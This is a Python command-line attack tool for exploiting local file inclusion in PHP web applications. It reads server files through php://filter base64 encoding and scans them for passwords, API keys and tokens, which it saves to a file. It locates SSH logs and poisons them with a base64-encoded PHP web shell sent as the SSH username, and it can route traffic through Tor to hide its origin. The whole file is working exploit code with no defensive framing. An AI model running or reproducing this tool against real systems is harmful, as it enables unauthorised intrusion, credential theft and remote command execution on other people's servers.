#!/usr/bin/env python3.11
import requests
import re
import urllib3
import argparse
import paramiko
import base64
import os
from urllib.parse import urlparse

COMMON_LOG_FILES = [
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/messages",
    "/var/log/syslog",
]

def detect_log_file(url, param, method="GET", proxies=None):
    print("[*] Searching for SSH log file...")
    for log_file in COMMON_LOG_FILES:
        response = exploit_lfi(url, param, log_file, method, proxies)
        if response and "Invalid user" in response.text:  # Indicator of SSH logs
            print(f"[+] Found log file: {log_file}")
            return log_file
    print("[-] No log files found. Try specifying manually.")
    return None

def exploit_lfi(url, param, lfi_payload, method="GET", proxies=None):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if method.upper() == "POST":
        response = requests.post(
            url,
            data={param: lfi_payload},  # <-- THIS LINE
            verify=False,
            proxies=proxies
        )
        print(f"[DEBUG] Final URL: {response.url}")

    elif method.upper() == "GET":
        print(f"[DEBUG] Sending payload: {lfi_payload}")
        response = requests.get(
            url,
            params={param: lfi_payload},
            verify=False,
            proxies=proxies
        )
        print(f"[DEBUG] Final URL: {response.url}")
    else:
        print("Unsupported method, try again...")
        return None

    if response.status_code != 200:
        print(f"[!] Unexpected status code: {response.status_code}")
    
    return response

def php_filter_base64(url, param, filename, method="GET", proxies=None):
    print("[*] Encoding php output in base64...")
    php_filter = "php://filter/convert.base64-encode/resource="
    filename = php_filter + filename

    response = exploit_lfi(url, param, filename, method, proxies)
    print("\n[DEBUG] FULL RESPONSE:\n")
    print(response.text)

    print("[*] Searching for base64...")
    
    # Looser regex for finding base64 inside responses
    matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', response.text)

    if not matches:
        print("[!] No base64 data found")
        print("[DEBUG] Response preview:\n", response.text[:500])
        return None

    # Try decoding each match until one works
    for candidate in matches:
        try:
            decoded = base64.b64decode(candidate, validate=True).decode(errors="ignore")
            print("[+] Successfully decoded payload:")
            print(decoded)
            return decoded
        except Exception:
            continue

    print("[!] Found base64 candidates but decoding failed")
    return None

def detect_secrets(url, param, filename, outfile, method="GET", proxies=None):
    print("[*] Searching for secrets...")

    decoded = php_filter_base64(url, param, filename, method, proxies)

    if not decoded:
        print("[-] No decoded content to scan.")
        return None

    secrets_patterns = [
        r"password\s*=\s*.*",
        r"pass\s*=\s*.*",
        r"passwd\s*=\s*.*",
        r"secret\s*=\s*.*",
        r"api_key\s*=\s*.*",
        r"token\s*=\s*.*",
        r"key\s*=\s*.*",
        r"auth_token\s*=\s*.*",
        r"auth_key\s*=\s*.*",
        r"secret_key\s*=\s*.*",
        r"secret_token\s*=\s*.*",
        r"access_token\s*=\s*.*",
    ]

    found = []

    for pattern in secrets_patterns:
        matches = re.findall(pattern, decoded, re.IGNORECASE)
        for match in matches:
            print(f"[+] Found: {match}")
            found.append(match)

    if found:
        with open(outfile, "a") as f:
            for item in found:
                f.write(item + "\n")
        print(f"[+] Secrets saved to {outfile}")
        return found
    else:
        print("[-] No secrets found.")
        return None

def session_exploit(url, cookie, param, lfi_payload, proxies=None):
    session = requests.Session()
    session.cookies.set("PHPSESSID", cookie)
    response = session.post(url, data={param: lfi_payload}, verify=False, proxies=proxies)
    return response

def ssh_log_poison(target_ip, port=22, use_tor=False):
    """
    Performs SSH log poisoning by injecting a Base64-encoded PHP shell as the username.
    If use_tor is True, the SSH connection is routed through Tor using torsocks.
    """
    php_payload = "<?php system($_GET['cmd']); ?>"
    encoded_payload = base64.b64encode(php_payload.encode()).decode()
    ssh_payload = f"<?php eval(base64_decode('{encoded_payload}')); ?>"
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[+] Attempting SSH log poisoning on {target_ip}...")

        if use_tor:
            print("[*] Routing SSH through Tor (requires torsocks)")
            os.system(f"torsocks ssh {ssh_payload}@{target_ip} -p {port}")

        else:
            client.connect(target_ip, port=port, username=ssh_payload, password="fakepass")
    except paramiko.AuthenticationException:
        print("[+] Authentication failed (as expected), but payload should be logged!")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="The target URL")
    parser.add_argument("param", help="The vulnerable parameter")
    parser.add_argument("lfi_payload", help="The LFI payload")
    parser.add_argument("method", choices=["GET", "POST"], nargs="?", default="POST", help="HTTP request type")
    parser.add_argument("--ssh", action="store_true", help="Perform SSH log poisoning")
    parser.add_argument("--cookie", help="The PHPSESSID cookie in case the vulnerability is authenticated.")
    parser.add_argument("--log-file", help="The log file to search for.")
    parser.add_argument("--tor", action="store_true", help="Use Tor to proxy the requests.")
    # Create the optional argument for php filters
    parser.add_argument("--php-filter", action="store_true", help="Use PHP filters to decode base64.")
    parser.add_argument("--secrets", action="store_true")
    parser.add_argument("--outfile", default="secrets.txt")

    args = parser.parse_args()
    
    proxies = None
    if args.tor:
        print("[*] Routing traffic through Tor...")
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

    if args.cookie:
        response = session_exploit(args.url, args.cookie, args.param, args.lfi_payload, proxies)
        print(response.text)

    if args.log_file:
        detect_log_file(args.url, args.param, args.method, proxies)

    if args.ssh:
        parsed_url = urlparse(args.url)
        target_ip = parsed_url.hostname

        if not target_ip:
            print("[-] Could not determine target IP. Make sure you provide a valid URL.")
        
        ssh_log_poison(target_ip, use_tor=args.tor)  # Now supports Tor!
    
    if args.secrets:
        detect_secrets(args.url, args.param, args.lfi_payload, args.secrets, args.method, proxies)

    if args.php_filter:
        result = php_filter_base64(
            args.url,
            args.param,
            args.lfi_payload,
            args.method,
            proxies
        )
        print(result)

    else:
        response = exploit_lfi(
            args.url,
            args.param,
            args.lfi_payload,
            args.method,
            proxies
        )
        print(response.text)
        
if __name__ == "__main__":
    main()
